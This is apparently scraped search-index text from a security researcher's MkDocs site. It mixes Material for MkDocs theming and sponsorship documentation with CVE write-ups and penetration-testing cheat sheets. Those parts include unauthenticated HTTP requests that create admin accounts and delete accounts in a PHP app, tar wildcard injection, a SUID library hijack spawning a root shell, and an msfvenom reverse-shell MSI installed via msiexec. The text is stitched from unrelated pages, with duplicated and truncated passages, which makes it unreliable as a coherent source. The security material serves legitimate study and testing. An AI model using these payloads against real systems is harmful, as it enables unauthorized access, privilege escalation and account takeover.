This makes it possible for authenticated attackers, with administrator-level permissions and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This only affects multi-site installations and installations where unfiltered_html has been disabled. CVE-2023-2648 \u00b6 File Renaming on Upload <= 2.5.1 - Authenticated (Admin+) Stored Cross-Site Scripting The CVE-2023-2684 vulnerability is a Stored Cross-Site Scripting (XSS) issue that exists within the plugin's setting panel. This plugin does not sanitise and escape datetime format settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.

However, as you write your documentation, you may reach a point where small adjustments are necessary to preserve your brand's style. Adding assets \u00b6 MkDocs provides several ways to customize a theme. In order to make a few small tweaks to Material for MkDocs, you can just add CSS and JavaScript files to the docs directory. Additional CSS \u00b6 If you want to tweak some colors or change the spacing of certain elements, you can do this in a separate style sheet. The easiest way is by creating a new style sheet file in the docs directory: . \u251c\u2500 docs/ \u2502 \u2514\u2500 stylesheets/ \u2502 \u2514\u2500 extra.css \u2514\u2500 mkdocs.yml Then, add the following lines to mkdocs.yml : extra_css : - stylesheets/extra.css Additional JavaScript \u00b6 If you want to integrate another syntax highlighter or add some custom logic to your theme, create a new JavaScript file in the docs directory: . \u251c\u2500 docs/ \u2502 \u2514\u2500 javascripts/ \u2502 \u2514\u2500 extra.js \u2514\u2500 mkdocs.yml Then, add the following lines to mkdocs.yml : extra_javascript : - javascripts/extra.js Extending the theme \u00b6 If you want to alter the HTML source (e.g. add or remove some parts), you can extend the theme. MkDocs supports theme extension , an easy way to override parts of Material for MkDocs without forking from git. This ensures that you can update to the latest version more easily. Setup and theme structure \u00b6 Enable Material for MkDocs as usual in mkdocs.yml , and create a new folder for overrides which you then reference using the custom_dir setting: theme : name : material custom_dir : overrides Theme extension prerequisites As the custom_dir setting is used for the theme extension process, Material for MkDocs needs to be installed via pip and referenced with the name setting in mkdocs.yml . It will not work when cloning from git . The structure in the overrides directory must mirror the directory structure of the original theme, as any file in the overrides directory will replace the file with the same name which is part of the original theme. Besides, further assets may also be put in the overrides directory: . \u251c\u2500 .icons/ # Bundled icon sets \u251c\u2500 assets/ \u2502 \u251c\u2500 images/ # Images and icons \u2502 \u251c\u2500 javascripts/ # JavaScript files \u2502 \u2514\u2500 stylesheets/ # Style sheets \u251c\u2500 partials/ \u2502 \u251c\u2500 integrations/ # Third-party integrations \u2502 \u2502 \u251c\u2500 analytics/ # Analytics integrations \u2502 \u2502 \u2514\u2500 analytics.html # Analytics setup \u2502 \u251c\u2500 languages/ # Translation languages \u2502 \u251c\u2500 content.html # Page content \u2502 \u251c\u2500 copyright.html # Copyright and theme information \u2502 \u251c\u2500 footer.html # Footer bar \u2502 \u251c\u2500 header.html # Header bar \u2502 \u251c\u2500 language.html # Translation setup \u2502 \u251c\u2500 logo.html # Logo in header and sidebar \u2502 \u251c\u2500 nav.html # Main navigation \u2502 \u251c\u2500 nav-item.html # Main navigation item \u2502 \u251c\u2500 palette.html # Color palette \u2502 \u251c\u2500 search.html # Search interface \u2502 \u251c\u2500 social.html # Social links \u2502 \u251c\u2500 source.html # Repository information \u2502 \u251c\u2500 source-file.html # Source file information \u2502 \u251c\u2500 tabs.html # Tabs navigation \u2502 \u251c\u2500 tabs-item.html # Tabs navigation item \u2502 \u251c\u2500 toc.html # Table of contents \u2502 \u2514\u2500 toc-item.html # Table of contents item \u251c\u2500 404 .html # 404 error page \u251c\u2500 base.html # Base template \u2514\u2500 main.html # Default page Overriding partials \u00b6 In order to override a partial, we can replace it with a file of the same name and location in the overrides directory. For example, to replace the original footer.html partial, create a new footer.html partial in the overrides directory: . \u251c\u2500 overrides/ \u2502 \u2514\u2500 partials/ \u2502 \u2514\u2500 footer.html \u2514\u2500 mkdocs.yml MkDocs will now use the new partial when rendering the theme. This can be done with any file. Overriding blocks recommended \u00b6 Besides overriding partials, it's also possible to override (and extend) template blocks, which are defined inside the templates and wrap specific features. In order to set up block overrides, create a main.html file inside the overrides directory: . \u251c\u2500 overrides/ \u2502 \u2514\u2500 main.html \u2514\u2500 mkdocs.yml Then, e.g. to override the site title, add the following lines to main.html : {% extends \"base.html\" %} {% block htmltitle %} < title > Lorem ipsum dolor sit amet </ title > {% endblock %} The following template blocks are provided by the theme: Block name Purpose analytics Wraps the Google Analytics integration announce Wraps the announcement bar config Wraps the JavaScript application config content Wraps the main content extrahead Empty block to add custom meta tags fonts Wraps the font definitions footer Wraps the footer with navigation and copyright header Wraps the fixed header bar hero Wraps the hero teaser (if available) htmltitle Wraps the <title> tag libs Wraps the JavaScript libraries (header) outdated Wraps the version warning scripts Wraps the JavaScript application (footer) site_meta Wraps the meta tags in the document head site_nav Wraps the site navigation and table of contents styles Wraps the style sheets (also extra sources) tabs Wraps the tabs navigation (if available) Theme development \u00b6 Material for MkDocs is built on top of TypeScript , RxJS and SASS , and uses a lean, custom build process to put everything together. 1 If you want to make more fundamental changes, it may be necessary to make the adjustments directly in the source of the theme and recompile it. Environment setup \u00b6 In order to start development on Material for MkDocs, a Node.js version of at least 14 is required. First, clone the repository: git clone https://github.com/squidfunk/mkdocs-material Next, all dependencies need to be installed, which is done with: cd mkdocs-material pip install -e . pip install mkdocs-minify-plugin pip install mkdocs-redirects npm install Development mode \u00b6 Start the watcher with: npm start Then, in a second terminal window, start the MkDocs live preview server with: mkdocs serve --watch-theme Point your browser to localhost:8000 and you should see this very documentation in front of you. Automatically generated files Never make any changes in the material directory, as the contents of this directory are automatically generated from the src directory and will be overwritten when the theme is built. Building the theme \u00b6 When you're finished making your changes, you can build the theme by invoking: npm run build # (1)! While this command will build all theme files, it will skip the overrides used in Material for MkDocs' own documentation which are not distributed with the theme. If you forked the theme and want to build the overrides as well, use: npm run build:all This will take longer, as now the icon search index, schema files, as well as additional style sheet and JavaScript files are built. This triggers the production-level compilation and minification of all style sheets and JavaScript files. After the command exits, the compiled files are located in the material directory. When running mkdocs build , you should now see your changes to the original theme. Prior to 7.0.0 the build was based on Webpack, resulting in occasional broken builds due to incompatibilities with loaders and plugins. Therefore, we decided to swap Webpack for a leaner solution which is now based on RxJS as the application itself. This allowed for the pruning of more than 500 dependencies (~30% less). \u21a9","title":"Customization"},{"location":"customization/#customization","text":"Project documentation is as diverse as the projects themselves and Material for MkDocs is a great starting point for making it look beautiful.

The fix includes a mandatory change of the base font-size from 10px to 20px which means all rem values needed to be updated. Within the theme, px to rem calculation is now encapsulated in a new function called px2rem which is part of the SASS code base. If you use Material for MkDocs with custom CSS that is based on rem values, note that those values must now be divided by 2. Now, 1.0rem doesn't map to 10px , but 20px . To learn more about the problem and implications, please refer to #911 in which the problem was discovered and fixed. Changes to mkdocs.yml \u00b6 None.

It marks a milestone in an individual's journey as a security researcher, demonstrating their expertise and contribution to the field. In this blog post, I am excited to share my personal journey of uncovering one of the initial CVEs identified by our team. We will delve into the details of CVE-2022-4229, a specific vulnerability impacting the SourceCodester Book Store Management System 1.0, and discuss the implications of its access control issue. Understanding CVE-2022-4229 \u00b6 CVE-2022-4229 is a vulnerability classified as critical was found in SourceCodester Book Store Management System 1.0. This vulnerability affects an unknown part of the file /bsms_ci/index.php. The manipulation with an unknown input leads to a access control vulnerability. The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor. As an impact it is known to affect confidentiality, integrity, and availability. Affected product(s)/code base : Book Store Management System Source Code Affected component(s): /bsms_ci/index.php/category/* /bsms_ci/index.php/book/* /bsms_ci/index.php/transaction/* /bsms_ci/index.php/history/* /bsms_ci/index.php/user/* Technical Details \u00b6 System Installation/Setup \u00b6 Open your XAMPP Control Panel and start Apache and MySQL. Extract the downloaded source code zip file. Copy the extracted source code folder and paste it into the XAMPP's \"htdocs\" directory. Browse the PHPMyAdmin in a browser. i.e. http://localhost/phpmyadmin Create a new database named ci_bsms_db. Import the provided SQL file. The file is known as ci_bsms_db.sql located inside the database folder. Browse the Book Store Management System in a browser. i.e. http://localhost/bsms_ci/ Source Code Analyst \u00b6 A PHP function called add() responsible for adding a user in the context of a Book Store Management System. Here's a breakdown of the code: /* Location: ./application/controllers/User.php */ public function add() { if ($this->input->post('save')) { if ($this->user->save_user()) { $this->session->set_flashdata('message', 'Used Added Successfully'); redirect('user','refresh'); } else { $this->session->set_flashdata('message', 'Failed to Add'); redirect('user','refresh'); } } } When this function is called, it first checks if the 'save' parameter is present in the POST request. If it exists, it calls the save_user() function of the $this->user object. If the save_user() function returns true, indicating that the user was successfully saved in the system, the code sets a flash message using set_flashdata() with the message \"User Added Successfully\". It then redirects the user to the 'user' page using the redirect() function. On the other hand, if the save_user() function returns false, indicating a failure in saving the user, the code sets a flash message with the message \"Failed to Add\" and redirects the user to the 'user' page. The save_user() function is called to save the user's information into the database. Here is the code for the function: /* Location: ./application/models/M_user.php */ public function save_user() { $object=array( 'user_code'=>$this->input->post('user_code'), 'fullname'=>$this->input->post('fullname'), 'username'=>$this->input->post('username'), 'password'=>md5($this->input->post('password')), 'level'=>$this->input->post('level') ); return $this->db->insert('user', $object); } In this code, the function creates an array called $object that contains the user's information. It retrieves the data from the POST request parameters such as user_code , fullname , username , password , and level . The md5() function is used to hash the password before storing it in the database. The function then calls the insert() method of the database object ( $this->db ) to insert the $object array into the user table. The function returns the result of the insert() method, which indicates whether the user was successfully saved in the database or not. \u27f9 After analyzing the code, it appears that there is a missing check for user authorization or privileges in the add() function. This omission can potentially lead to a security vulnerability where unauthorized users can access and add users to the system.

Here's a breakdown of the code: /* Location: ./application/controllers/User.php */ public function add() { if ($this->input->post('save')) { if ($this->user->save_user()) { $this->session->set_flashdata('message', 'Used Added Successfully'); redirect('user','refresh'); } else { $this->session->set_flashdata('message', 'Failed to Add'); redirect('user','refresh'); } } } When this function is called, it first checks if the 'save' parameter is present in the POST request. If it exists, it calls the save_user() function of the $this->user object. If the save_user() function returns true, indicating that the user was successfully saved in the system, the code sets a flash message using set_flashdata() with the message \"User Added Successfully\". It then redirects the user to the 'user' page using the redirect() function. On the other hand, if the save_user() function returns false, indicating a failure in saving the user, the code sets a flash message with the message \"Failed to Add\" and redirects the user to the 'user' page. The save_user() function is called to save the user's information into the database. Here is the code for the function: /* Location: ./application/models/M_user.php */ public function save_user() { $object=array( 'user_code'=>$this->input->post('user_code'), 'fullname'=>$this->input->post('fullname'), 'username'=>$this->input->post('username'), 'password'=>md5($this->input->post('password')), 'level'=>$this->input->post('level') ); return $this->db->insert('user', $object); } In this code, the function creates an array called $object that contains the user's information. It retrieves the data from the POST request parameters such as user_code , fullname , username , password , and level . The md5() function is used to hash the password before storing it in the database. The function then calls the insert() method of the database object ( $this->db ) to insert the $object array into the user table. The function returns the result of the insert() method, which indicates whether the user was successfully saved in the database or not. \u27f9 After analyzing the code, it appears that there is a missing check for user authorization or privileges in the add() function. This omission can potentially lead to a security vulnerability where unauthorized users can access and add users to the system.","title":"Source Code Analyst"},{"location":"blog/2022/CVE-2022-4229/#exploitation-execution","text":"","title":"Exploitation Execution"},{"location":"blog/2022/CVE-2022-4229/#add-new-account-without-cookie","text":"Request: POST /bsms_ci/index.php/user/add HTTP / 1.1 Host : localhost Content-Length : 64 Cache-Control : max-age=0 sec-ch-ua : \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile : ?0 sec-ch-ua-platform : \"Windows\" Upgrade-Insecure-Requests : 1 Origin : http://localhost Content-Type : application/x-www-form-urlencoded User-Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36 Accept : text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site : same-origin Sec-Fetch-Mode : navigate Sec-Fetch-User : ?1 Sec-Fetch-Dest : document Referer : http://localhost/bsms_ci/index.php/user Accept-Encoding : gzip, deflate Accept-Language : en-US,en;q=0.9 Connection : close fullname=john&username=john&password=12345&level=admin&save=Save","title":"Add new account without cookie"},{"location":"blog/2022/CVE-2022-4229/#delete-account-without-cookie","text":"GET /bsms_ci/index.php/user/hapus/2 HTTP / 1.1 Host : localhost sec-ch-ua : \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile : ?0 sec-ch-ua-platform : \"Windows\" Upgrade-Insecure-Requests : 1 User-Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36 Accept : text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site : same-origin Sec-Fetch-Mode : navigate Sec-Fetch-User : ?1 Sec-Fetch-Dest : document Referer : http://localhost/bsms_ci/index.php/user Accept-Encoding : gzip, deflate Accept-Language : en-US,en;q=0.9 Connection : close","title":"Delete account without cookie"},{"location":"blog/2022/CVE-2022-4278/","text":"SourceCodester Human Resource Management System employeeadd.php sql injection \u00b6 NGO VAN TU \u00b7 @tusnj December 03, 2022 \u00b7 5 min read \u00b7 Introduction \u00b6 Human Resource Management System is a web application that was developed in PHP and MySQL Database.

As a security enthusiast, I decided to delve deeper into its code and settings to ensure it was robust and free from vulnerabilities. About my CVE \u00b6 The CVE-2023-2684 vulnerability is a Stored Cross-Site Scripting (XSS) issue that exists within the plugin's setting panel. This plugin does not sanitise and escape datetime format settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed. Affected wordpress plugin : https://wpscan.com/plugin/file-renaming-on-upload CVE reference : https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-renaming-on-upload/file-renaming-on-upload-251-authenticated-admin-stored-cross-site-scripting Vulnerability Analysis \u00b6 In the plugin's settings panel, there is a datetime setting rule for renaming filenames, which is accompanied by an example showing the output time. Without diving into knowledge of programming WordPress plugins and library usage, we can still exploit this vulnerability by carefully examining the following code snippet: <?php // class-datetime-option.php public function add_fields ( $fields , $section ) { $datetime = \\DateTime :: createFromFormat ( 'U.u' , number_format ( microtime ( true ), 6 , '.' , '' ) ); $format = $datetime -> format ( $this -> get_option ( $this -> option_datetime_format , 'Y-m-d_H-i-s_u' ) ); $new_options = array ( array ( 'name' => $this -> option_id , 'label' => __ ( 'Datetime' , 'file-renaming-on-upload' ), 'desc' => __ ( 'Enables Datetime rule' , 'file-renaming-on-upload' ) .

We should consider that if the result of the datetime includes HTML tags, it could potentially introduce an XSS vulnerability. To exploit this vulnerability, all we need to do is find a way to manipulate the datetime function to generate the desired HTML syntax. According to the instructions, we can use the formatting provided in this PHP function: https://www.php.net/manual/en/function.date.php . <?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone $today = date ( \"F j, Y, g:i a\" ); // March 10, 2001, 5:16 pm $today = date ( \"m.d.y\" ); // 03.10.01 $today = date ( \"j, n, Y\" ); // 10, 3, 2001 $today = date ( \"Ymd\" ); // 20010310 $today = date ( 'h-i-s, j-m-y, it is w Day' ); // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date ( '\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.' ); // it is the 10th day. $today = date ( \"D M j G:i:s T Y\" ); // Sat Mar 10 17:16:18 MST 2001 $today = date ( 'H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h' ); // 17:03:18 m is month $today = date ( \"H:i:s\" ); // 17:16:18 $today = date ( \"Y-m-d H:i:s\" ); // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?> To keep the characters intact, we need to append a backslash (\\) before each one.

Read on to learn what sponsorships achieve , how to become a sponsor to get access to Insiders, and what's in for you ! This documentation is built with Insiders squidfunk.github.io/mkdocs-material What is Insiders? \u00b6 Material for MkDocs Insiders is a private fork of Material for MkDocs, hosted as a private GitHub repository. Almost 1 all new features are developed as part of this fork, which means that they are immediately available to all eligible sponsors, as they are made collaborators of this repository. Every feature is tied to a funding goal in monthly subscriptions. When a funding goal is hit, the features that are tied to it are merged back into Material for MkDocs and released for general availability, making them available to all users. Bugfixes are always released in tandem. Sponsorships start as low as $10 a month . 2 What sponsorships achieve \u00b6 Sponsorships make this project sustainable, as they buy the maintainers of this project time \u2013 a very scarce resource \u2013 which is spent on the development of new features, bug fixing, stability improvement, issue triage and general support. The biggest bottleneck in Open Source is time. 3 If you're unsure if you should sponsor this project, check out the list of completed funding goals to learn whether you're already using features that were developed with the help of sponsorships. You're most likely using at least a handful of them, thanks to our awesome sponsors ! What's in for me? \u00b6 The moment you become a sponsor , you'll get immediate access to 24 additional features that you can start using right away, and which are currently exclusively available to sponsors: Meta plugin Additional tags indexes Document contributors Automatic light / dark mode Content tabs: anchor links Navigation pruning Tooltips Chinese search support Tag icons Card grids Offline plugin Privacy plugin Table of contents anchor following Annotations Navigation icons Sidebars automatically scroll to active item Code annotations: anchor links Code annotations: strip comments Brand new search plugin Rich search previews Tokenizer with lookahead Advanced search highlighting Excluding content from search Social cards New features are added every other week. Be sure to come back. How to become a sponsor \u00b6 Thanks for your interest in sponsoring! In order to become an eligible sponsor with your GitHub account, visit squidfunk's sponsor profile , and complete a sponsorship of $10 a month or more . You can use your individual or organization GitHub account for sponsoring. Important : If you're sponsoring @squidfunk through a GitHub organization, please send a short email to sponsors@squidfunk.com with the name of your organization and the GitHub account of the individual that should be added as a collaborator. 4 You can cancel your sponsorship anytime. 5 Join our awesome sponsors Special thanks to our premium sponsors : If you sponsor publicly, you're automatically added here with a link to your profile and avatar to show your support for Material for MkDocs. Alternatively, if you wish to keep your sponsorship private, you'll be a silent +1. You can select visibility during checkout and change it afterwards. Funding \u00b6 Goals \u00b6 The following section lists all funding goals. Each goal contains a list of features prefixed with a checkmark symbol, denoting whether a feature is already available or planned, but not yet implemented. When the funding goal is hit, the features are released for general availability. $ 8,000 \u2013 Scotch Bonnet \u00b6 Social cards Code annotations: anchor links Code annotations: strip comments Tag icons Table of contents anchor following Sidebars automatically scroll to active item $ 10,000 \u2013 Carolina Reaper \u00b6 Brand new search plugin Rich search previews Tokenizer with lookahead Advanced search highlighting Excluding content from search Offline plugin $ 12,000 \u2013 Piri Piri \u00b6 Annotations Chinese search support Navigation icons Navigation pruning Navigation status badges Blog plugin $ 14,000 \u2013 Goat's Horn \u00b6 Privacy plugin Card grids Tooltips Content tabs: anchor links Automatic light / dark mode Document contributors $ 16,000 \u2013 Chipotle \u00b6 Meta plugin Additional tags indexes Instant previews ... more to be announced Goals completed \u00b6 This section lists all funding goals that were previously completed, which means that those features were part of Insiders, but are now generally available and can be used by all users. $ 7,000 \u2013 Royal Gold \u00b6 Cookie consent Was this page helpful?

Is this still possible? Yes. Insiders is compatible with Material for MkDocs. Almost all new features and configuration options are either backward-compatible or implemented behind feature flags. When working with outside collaborators, it should be rarely necessary to change the general appearance of your site. Most Insiders features enhance the overall experience, e.g. by adding icons to pages or providing a feedback widget. While this features add value for the user of your site, they shouldn't be necessary for previewing when making changes to content. Currently, the only content-related features in Insiders that can't be properly previewed by non-Insiders users are: Annotations Card grids This means that outside collaborators are able to build the documentation locally with Material for MkDocs and when they push their changes, your CI pipeline will build it with Insiders. When using built-in plugins that are exclusive to Insiders, it's recommended to split configuration into a base mkdocs.yml and one with plugin overrides via configuration inheritance . See the getting started guide for more information. Payment \u00b6 We don't want to pay for sponsorship every month. Are there any other options? Yes. You can sponsor on a yearly basis by switching your GitHub account to a yearly billing cycle . If for some reason you cannot do that, you could also create a dedicated GitHub account with a yearly billing cycle, which you only use for sponsoring (some sponsors already do that). If you have any problems or further questions, please reach out to sponsors@squidfunk.com . Terms \u00b6 Are we allowed to use Insiders under the same terms and conditions as Material for MkDocs? Yes. Whether you're an individual or a company, you may use Material for MkDocs Insiders precisely under the same terms as Material for MkDocs, which are given by the MIT license . However, we kindly ask you to respect our fair use policy : Please don't distribute the source code of Insiders. You may freely use it for public, private or commercial projects, privately fork or mirror it, but please don't make the source code public, as it would counteract the sponsorware strategy. If you cancel your subscription, you're automatically removed as a collaborator and will miss out on all future updates of Insiders. However, you may use the latest version that's available to you as long as you like . Just remember that GitHub deletes private forks . In general, every new feature is first exclusively released to sponsors, but sometimes upstream dependencies like Python Markdown Extensions enhance existing features that must be supported by Material for MkDocs. \u21a9 Note that $10 a month is the minimum amount to become eligible for Insiders. While GitHub Sponsors also allows to sponsor lower amounts or one-time amounts, those can't be granted access to Insiders due to technical reasons. \u21a9 Making an Open Source project sustainable is exceptionally hard: maintainers burn out, projects are abandoned. That's not great and very unpredictable. The sponsorware model ensures that if you decide to use Material for MkDocs, you can be sure that bugs are fixed quickly and new features are added regularly. \u21a9 It's currently not possible to grant access to each member of an organization, as GitHub only allows for adding users. Thus, after sponsoring, please send an email to sponsors@squidfunk.com , stating which account should become a collaborator of the Insiders repository. We're working on a solution which will make access to organizations much simpler. To ensure that access is not tied to a particular individual GitHub account, create a bot account (i.e. a GitHub account that is not tied to a specific individual), and use this account for the sponsoring. After being added to the list of collaborators, the bot account can create a private fork of the private Insiders GitHub repository, and grant access to all members of the organizations. \u21a9 If you cancel your sponsorship, GitHub schedules a cancellation request which will become effective at the end of the billing cycle. This means that even though you cancel your sponsorship, you will keep your access to Insiders as long as your cancellation isn't effective. All charges are processed by GitHub through Stripe. As we don't receive any information regarding your payment, and GitHub doesn't offer refunds, sponsorships are non-refundable. \u21a9","title":"Insiders"},{"location":"insiders/#insiders","text":"Material for MkDocs follows the sponsorware release strategy, which means that new features are first exclusively released to sponsors as part of Insiders .

If you have any problems or further questions, please reach out to sponsors@squidfunk.com .","title":"Payment"},{"location":"insiders/#terms","text":"Are we allowed to use Insiders under the same terms and conditions as Material for MkDocs? Yes. Whether you're an individual or a company, you may use Material for MkDocs Insiders precisely under the same terms as Material for MkDocs, which are given by the MIT license . However, we kindly ask you to respect our fair use policy : Please don't distribute the source code of Insiders. You may freely use it for public, private or commercial projects, privately fork or mirror it, but please don't make the source code public, as it would counteract the sponsorware strategy. If you cancel your subscription, you're automatically removed as a collaborator and will miss out on all future updates of Insiders. However, you may use the latest version that's available to you as long as you like . Just remember that GitHub deletes private forks . In general, every new feature is first exclusively released to sponsors, but sometimes upstream dependencies like Python Markdown Extensions enhance existing features that must be supported by Material for MkDocs. \u21a9 Note that $10 a month is the minimum amount to become eligible for Insiders. While GitHub Sponsors also allows to sponsor lower amounts or one-time amounts, those can't be granted access to Insiders due to technical reasons. \u21a9 Making an Open Source project sustainable is exceptionally hard: maintainers burn out, projects are abandoned. That's not great and very unpredictable. The sponsorware model ensures that if you decide to use Material for MkDocs, you can be sure that bugs are fixed quickly and new features are added regularly. \u21a9 It's currently not possible to grant access to each member of an organization, as GitHub only allows for adding users. Thus, after sponsoring, please send an email to sponsors@squidfunk.com , stating which account should become a collaborator of the Insiders repository. We're working on a solution which will make access to organizations much simpler. To ensure that access is not tied to a particular individual GitHub account, create a bot account (i.e. a GitHub account that is not tied to a specific individual), and use this account for the sponsoring. After being added to the list of collaborators, the bot account can create a private fork of the private Insiders GitHub repository, and grant access to all members of the organizations. \u21a9 If you cancel your sponsorship, GitHub schedules a cancellation request which will become effective at the end of the billing cycle. This means that even though you cancel your sponsorship, you will keep your access to Insiders as long as your cancellation isn't effective. All charges are processed by GitHub through Stripe. As we don't receive any information regarding your payment, and GitHub doesn't offer refunds, sponsorships are non-refundable.

In some cases you may have permission to run some commands with sudo privileges without a password. sudo -l Warning Use the same command as in the output of the sudo -l command, without shortening. Cron Jobs \u00b6 Info Cron jobs are programs/scripts run at specific times or interval. ls -lah /etc/cron* cat /etc/crontab crontab -l Cron job watching Some cron process of root can not to find by listing, Use pspy to monitor process ./pspy64 -pf -i 1000 Then, try to modify or injection the cron job script. File permissions \u00b6 The cron job script can be modify by non owner user. Depending on the situation, we can replace the script with: Our reverse shell Set SUID for /bin/bash (or other program) Change/Create root user ... PATH Environment Variable \u00b6 Look for PATH variable in /etc/crontab $ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL = /bin/sh PATH = /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin ... Then, check the permission on /home/user , if have write permssion, replace the cron job execute script. Wildcards injection \u00b6 Backup scripts often use tar to create compress files. If using tar with wildcard (*), wildcard injection technique can be used to exploit. Create 2 files with names: --checkpoint=1 and --checkpoint-action=exec=shell.elf touch /home/user/--checkpoint = 1 touch /home/user/--checkpoint-action = exec = shell.elf Wait for cron job to compress files. The tar command will interpret files --checkpoint=1 and --checkpoint-action=exec=shell.elf as 2 options instead of file names. See more exploits at https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks Note Can use this exploit with SUID SUID/SGID \u00b6 The SUID/SGID allows files to be executed with the permission level of the file owner or the group owner. Enumerate for SUID find / -perm -u = s -type f 2 >/dev/null SUID Known Exploits \u00b6 See how to exploit on GTFOBins and ExploitDB SUID Environment variables \u00b6 Use strings to look for relative path program. Example: call service instead of /usr/bin/service strings /usr/bin/suidprogram Then, create a fake program echo \"bash -p\" > /tmp/service Add /tmp to $PATH export PATH = /tmp: $PATH Finally, run the SUID Dynamic Library Hijacking \u00b6 Check SUID share library ldd /usr/bin/suidprogram Determine which share library configuration files available ls -l /etc/ld.so.conf.d/ Build C++ privilege escalation code //gcc -shared -o libcustom.so -fPIC libcustom.c #include <stdio.h> #include <unistd.h> #include <sys/types.h> void say_hi (){ setuid ( 0 ); setgid ( 0 ); system ( \"/bin/sh\" , NULL , NULL ); } export PATH Recheck the the SUID ldd /usr/bin/suidprogram Finally, run the SUID.

Spend some time and read over the results of your enumeration. If WinPEAS or another tool finds something interesting, make a note of it. Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work. Have a quick look around for files in your user\u2019s desktop and other common locations (e.g. C: and C:\\Program Files). Read through interesting files that you find, as they may contain useful information that could help escalate privileges. Try things that don\u2019t have many steps first, e.g. registry exploits, services, etc. Have a good look at admin processes, enumerate their versions and search for exploits. Check for internal ports that you might be able to forward to your attacking machine. If you still don\u2019t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.

Since registry entries can have ACLs(access control lists), if the ACL is misconfigured, it may be possible to modify a service\u2019s configuration even if we cannot modify the service directly. If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then we can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then our program will execute, allowing the us to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

This will amplify network visibility and allow the attacker to target hosts not directly visible from the original attack machine. We can also investigate port bindings to see if a running service is only available on a loopback address, rather than on a routable one. Investigating a privileged program or service listening on the loopback interface could expand our attack surface and increase our probability of a privilege escalation attack.

If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system. In addition, we can gather information about inbound and outbound port filtering during this phase to facilitate port forwarding and tunneling when it's time to pivot to an internal network.

There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges. We call this the \u201cCitrix Method\u201d because it uses many of the same techniques used to break out of Citrix environments. Startup Apps \u00b6 info Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in. Add a startup script to this directory upon script execution Readable/Writable Files & Directories \u00b6 info This most often happens when an attacker can modify scripts or binary files that are executed under the context of a privileged account.

AccessToString -match \"Everyone\\sAllow\\s\\sModify\" } Unmounted Disks \u00b6 info On most systems, drives are automatically mounted at boot time. Because of this, it's easy to forget about unmounted drives that could contain valuable information. We should always look for unmounted drives, and if they exist, check the mount permissions.

These \u201cAutoRuns\u201d are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges C :\\ Cas > copy / Y shell . exe \"C:\\Program Files\\Autorun Program\\program.exe\" AlwaysInstallElevated \u00b6 info The catch is that two Registry settings must be enabled for this to work. The \u201cAlwaysInstallElevated\u201d value must be set to 1 for both the local machine: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer and the current user: HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer If either of these are missing or disabled, the exploit will not work. MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell. Generate a new reverse shell with msi extension C :\\ Cas > msfvenom -p windows / x64 / shell_reverse_tcp lhost =< my-ip > lport = 443 -f msi -o shell . msi C :\\ Cas > msiexec / quiet / qn / i shell . msi Passwords \u00b6 Registry \u00b6 info Registry \u2014 \u201cPlenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords.\u201d Saved Creds \u00b6 info Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user\u2019s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement. C :\\ Cas > cmdkey / list C :\\ Cas > runas / savecred / user :< user_name > shell . exe Security Account Manager (SAM) \u00b6 info \u201cWindows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.\u201d The SAM and SYSTEM files: `C:\\\\Windows\\System32\\config ` Backups of the files may exist: `C:\\\\Windows\\\\Repair` or `C:\\\\Windows\\\\System32\\\\config\\\\RegBack ` Extract the hash using 